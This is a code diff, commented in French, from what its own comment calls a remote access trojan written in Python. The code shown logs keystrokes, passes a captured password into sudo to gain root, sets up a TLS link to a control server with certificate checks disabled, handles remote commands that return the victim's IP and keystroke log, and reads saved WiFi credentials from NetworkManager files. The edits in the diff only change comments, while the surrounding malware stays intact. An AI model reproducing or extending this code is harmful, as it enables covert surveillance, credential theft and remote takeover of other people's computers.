@@ -23,11 +23,9 @@ def demarrer_surveillance_clavier():
     with keyboard.Listener(on_press=enregistreur_frappe) as auditeur:
         auditeur.join()
 
-# --- NOUVELLE FONCTION : ÉLÉVATION DE PRIVILÈGES ---
 def executer_avec_privileges(commande, mot_de_passe):
     """Injecte le mot de passe dans sudo via stdin"""
     try:
-        # L'option -S lit le mot de passe depuis l'entrée standard
         cmd_complete = f"echo {mot_de_passe} | sudo -S {commande}"
         processus = subprocess.run(cmd_complete, shell=True, capture_output=True, text=True)
         return processus.stdout + processus.stderr
@@ -35,6 +33,7 @@ def executer_avec_privileges(commande, mot_de_passe):
         return f"Erreur d'élévation : {str(e)}"
 
 def initialisation_flux():
+    # Connexion sécurisée au serveur
     connexion_brute = None
     reglages = ssl.create_default_context()
     reglages.check_hostname = False
@@ -61,7 +60,8 @@ def initialisation_flux():
 
 def executeur_de_requetes(instruction, lien_socket):
     global journal_touches
-    
+
+    # Liste des fonctions du RAT
     if instruction == "get_ip":
         return subprocess.check_output("hostname -I", shell=True).decode().strip()
     
@@ -76,7 +76,6 @@ def executeur_de_requetes(instruction, lien_socket):
         journal_touches = "" 
         return extraction if extraction != "" else "Aucune frappe enregistrée."
 
-    # --- NOUVELLE COMMANDE : SUDOCMD ---
     elif instruction.startswith("sudocmd "):
         # Format : sudocmd <password> <commande>
         parties = instruction.split(" ", 2)
@@ -127,6 +126,7 @@ def envoi_flux_binaire(liste_p, sock):
     sock.send("[SYNC]".encode())
 
 def recuperer_configs_reseau():
+    # Lit les fichiers WiFi
     try:
         dossier_nm = "/etc/NetworkManager/system-connections/" 
         resultats = []
